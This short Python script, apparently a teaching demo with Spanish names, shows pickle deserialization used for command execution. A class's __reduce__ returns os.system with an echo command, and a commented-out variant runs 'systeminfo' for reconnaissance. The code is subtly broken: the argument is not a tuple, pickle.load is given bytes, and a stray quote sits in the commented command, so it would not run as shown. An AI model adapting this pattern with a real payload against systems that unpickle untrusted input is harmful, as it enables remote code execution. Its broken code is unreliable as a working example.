import os
import pickle

class Malicioso:
    def __reduce__(self):
        return (os.system, ("echo, 'hola TEXTO QUE SE EJECUTA EN EL SISTEMA'"))
        #return (os.system, ("systeminfo'"))
    
carga = pickle.dumps(Malicioso())

# print(carga)

pickle.load(carga)
